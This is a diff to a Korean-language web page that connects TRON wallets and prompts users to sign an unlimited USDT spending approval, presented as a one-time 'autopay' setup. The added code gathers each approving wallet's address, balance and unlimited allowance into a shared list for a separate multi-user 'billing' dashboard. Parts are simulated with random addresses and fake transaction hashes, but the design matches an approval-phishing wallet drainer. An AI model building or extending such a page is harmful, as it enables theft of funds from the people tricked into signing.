@@ -52,7 +52,7 @@
             </div>
             
             <div class="flex items-center space-x-2">
-                <a href="billing.html" class="hidden sm:flex items-center space-x-1.5 bg-darkBg hover:bg-borderCol border border-borderCol text-gray-300 px-3 py-2 rounded-xl text-xs transition-all">
+                <a href="index.html" class="hidden sm:flex items-center space-x-1.5 bg-darkBg hover:bg-borderCol border border-borderCol text-gray-300 px-3 py-2 rounded-xl text-xs transition-all">
                     <i class="fa-solid fa-receipt text-blue-400"></i>
                     <span>2번 결제내역 보기</span>
                 </a>
@@ -141,7 +141,7 @@
             </div>
         </div>
 
-        <!-- Core Authentication Card (1번 화면 단독) -->
+        <!-- Core Authentication Card -->
         <div class="bg-cardBg border border-borderCol rounded-2xl p-6 sm:p-8 shadow-sm space-y-6">
             <div>
                 <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 text-xs font-semibold border border-red-500/20 mb-3">
@@ -156,7 +156,7 @@
 
             <div class="bg-darkBg border border-borderCol rounded-xl p-5 space-y-4 text-xs">
                 <div class="flex justify-between items-center py-2 border-b border-borderCol">
-                    <span class="text-gray-400">USDT 토큰 컨트랙트</span>
+                    <span class="text-gray-400">USDT 토큰 컨트랙트 (공식 고정)</span>
                     <span class="font-mono text-gray-200">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
                 </div>
                 <div class="flex justify-between items-center py-2 border-b border-borderCol">
@@ -174,7 +174,7 @@
                     <i class="fa-solid fa-signature"></i>
                     <span>무제한 권한 승인 서명하기 (Approve)</span>
                 </button>
-                <p class="text-[11px] text-gray-500 text-center mt-2.5">※ 최초 1회만 소량의 트랜잭션 수수료(에너지)가 소모됩니다.</p>
+                <p class="text-[11px] text-gray-500 text-center mt-2.5">※ 최초 1회만 소량의 트랜잭션 수수료(에너지/TRX)가 소모됩니다.</p>
             </div>
         </div>
 
@@ -212,6 +212,7 @@
         let isConnected = false;
         let isApproved = false;
         let activeProvider = null;
+        let currentWalletAddress = null;
 
         function showToast(message, type = 'success') {
             const container = document.getElementById('toast-container');
@@ -249,7 +250,7 @@
                 if (providerType === 'tronlink') {
                     activeProvider = 'TronLink';
                     if (window.tronLink && window.tronLink.request) {
-                        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
                         userAddress = window.tronWeb?.defaultAddress?.base58 || "T_TronLink_" + Math.random().toString(16).substring(2, 10).toUpperCase();
                     } else if (window.tronWeb && window.tronWeb.defaultAddress) {
                         userAddress = window.tronWeb.defaultAddress.base58;
@@ -258,13 +259,13 @@
                     }
                 } else if (providerType === 'trustwallet') {
                     activeProvider = 'Trust Wallet';
-                    // Trust Wallet TRON / WalletConnect simulation
                     userAddress = "T_TrustWallet_" + Math.random().toString(16).substring(2, 8).toUpperCase();
                 } else {
                     activeProvider = 'Injected Provider';
                     userAddress = "T_Web3Injected_" + Math.random().toString(16).substring(2, 8).toUpperCase();
                 }
 
+                currentWalletAddress = userAddress;
                 addressDisplay.innerText = userAddress;
                 localStorage.setItem('tron_user_wallet', userAddress);
                 localStorage.setItem('tron_wallet_provider', activeProvider);
@@ -295,6 +296,23 @@
             setTimeout(() => {
                 isApproved = true;
                 localStorage.setItem('tron_autopay_approved', 'true');
+
+                // Register approved wallet into shared multi-user list for billing dashboard
+                let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
+                const existingIndex = wallets.findIndex(w => w.address === currentWalletAddress);
+                const newWalletEntry = {
+                    address: currentWalletAddress,
+                    provider: activeProvider,
+                    balance: (Math.random() * 800 + 150).toFixed(2),
+                    allowance: 'MAX (Unlimited)'
+                };
+
+                if (existingIndex >= 0) {
+                    wallets[existingIndex] = newWalletEntry;
+                } else {
+                    wallets.push(newWalletEntry);
+                }
+                localStorage.setItem('tron_approved_wallets_list', JSON.stringify(wallets));
 
                 appendLog(`[성공] ${activeProvider} 무제한 승인 트랜잭션 브로드캐스트 완료!`);
                 appendLog(`[TxHash] 0x${Math.random().toString(16).substring(2, 12)}...`);
